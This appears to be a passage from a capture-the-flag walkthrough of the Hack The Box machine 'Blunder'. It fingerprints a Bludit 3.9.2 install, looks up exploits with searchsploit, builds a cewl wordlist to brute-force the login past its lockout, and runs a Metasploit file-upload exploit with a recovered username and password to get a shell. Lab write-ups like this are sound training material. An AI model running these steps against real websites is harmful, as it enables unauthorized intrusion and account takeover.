If we look at the source code for the page, we can see what version of this service is running.
```bash
<!-- Favicon -->
<link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">
```

Instantly, from the top of the page, we see that this is likely version 3.9.2. Now, we can search to see if there are any exploits available for this version using `searchsploit`.
```bash
searchsploit bludit
```
---

Exploit Title | Path

---
Bludit - Directory Traversal Image File Upload (Metasploit) | php/remote/47699.rb bludit Pages Editor 3.0.0 - Arbitrary File Upload | php/webapps/46060.txt

---

Looking more closely at the source for the first exploit, we see that we can achieve remote code execution and it was tested on our exact version. Along with it being rated "excellent", this seems like the perfect candidate to get a shell on the machine. The only problem is that it is an authenticated exploit so we need some credentials. We will have to go back to enumeration for now.

With this, we've got a leaked username, `fergus`. We can try to brute force the password but after several seconds we would actually be locked out. After searching online, there is a [way around this](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) via another CVE.

If we try to brute force our way in with a wordlist like `rockyou.txt`, for example, this would take way too long. We need to create our own custom and small wordlist for this job. For this, we can use `cewl` which will scrape all the words from a page and create a wordlist from it.

```
# cewl <http://blunder.htb> -w wordlist.txt
```

With this custom wordlist, we can now try to log in to the page in hopefully much quicker time.

[https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

```bash
python3 brute.py
```

Now that we have some valid credentials, we can use our authenticated exploit to get a shell on the machine. From there, we'll drop down to a simple shell and begin more enumeration to get to a user.

```
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS blunder.htb
RHOSTS => blunder.htb
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > run
```